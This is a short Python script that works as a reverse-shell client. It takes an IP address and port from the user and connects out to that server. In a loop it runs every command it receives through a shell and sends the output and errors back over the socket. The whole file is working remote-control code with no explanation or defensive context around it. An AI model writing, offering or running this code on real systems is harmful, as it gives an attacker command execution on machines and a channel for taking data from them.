import re
import socket
import subprocess
import sys

#Get server IP
Server_Host = input("Server_IP? ")

#Validate IP Address
def validate_ip_address(address):
    match = re.match(r"^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$", address)

    if bool(match) is False:
        print("IP address {} is not valid".format(address))
        sys.exit()
        return False

    for part in address.split("."):
        if int(part) < 0 or int(part) > 255:
            print("IP address {} is not valid".format(address))
            return False

    print("IP address {} is valid".format(address))
    return True

#Run IP Validation Function
validate_ip_address(Server_Host)

#Ask for Server Port
Server_Port = input("Server port? ")

#Print Server Host and Port
print("Server_Host ", Server_Host)
print("Server Port ", Server_Port)

#Setup Socket
soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

#Show connection established
print("Connection Established: ", Server_Host, ":", Server_Port)

#connect to Server host and port
soc.connect((Server_Host, int(Server_Port)))

#Run command loop
while True:
    cmd_data = soc.recv(4096)
    print("Execute ", cmd_data.decode())
    #Run subproces to get stdinout and error
    opsub = subprocess.Popen(cmd_data.decode(), shell=True,
                          stdout=subprocess.PIPE,
                          stdin=subprocess.PIPE,
                          stderr=subprocess.PIPE)

    #Get command output and send back to Server
    cmdoutput = opsub.stdout.read()
    cmdoutput_error = opsub.stderr.read()

    print(cmdoutput.decode())
    print(cmdoutput_error)

    soc.sendall(cmdoutput)
    soc.sendall(cmdoutput_error)
